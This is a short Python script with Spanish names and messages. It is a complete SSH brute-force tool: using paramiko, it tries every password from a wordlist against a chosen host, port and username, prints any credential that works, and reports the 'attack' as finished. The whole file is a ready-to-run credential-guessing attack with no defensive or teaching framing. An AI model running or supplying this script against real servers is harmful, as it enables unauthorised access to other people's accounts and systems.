import argparse
import time

import paramiko


def probar_credencial(destino, puerto, usuario, contrasena, tiempo_limite=3):
    cliente = paramiko.SSHClient()
    cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        cliente.connect(destino, port=puerto, username=usuario, password=contrasena, timeout=tiempo_limite)
        cliente.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as error:
        print(f"  error de conexion: {error}")
        return False


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--destino", required=True)
    parser.add_argument("--puerto", type=int, default=22)
    parser.add_argument("--usuario", required=True)
    parser.add_argument("--diccionario", required=True)
    parser.add_argument("--retardo", type=float, default=0)
    args = parser.parse_args()

    with open(args.diccionario, "r", encoding="utf-8") as f:
        contrasenas = [linea.strip() for linea in f if linea.strip()]

    print(f"Probando {len(contrasenas)} contrasenas contra {args.destino}:{args.puerto} usuario={args.usuario}")

    for contrasena in contrasenas:
        print(f"Probando: {contrasena}")
        exito = probar_credencial(args.destino, args.puerto, args.usuario, contrasena)
        if exito:
            print(f"CREDENCIAL VALIDA: {args.usuario}:{contrasena}")
            break
        if args.retardo > 0:
            time.sleep(args.retardo)

    print("Ataque finalizado.")


if __name__ == "__main__":
    main()
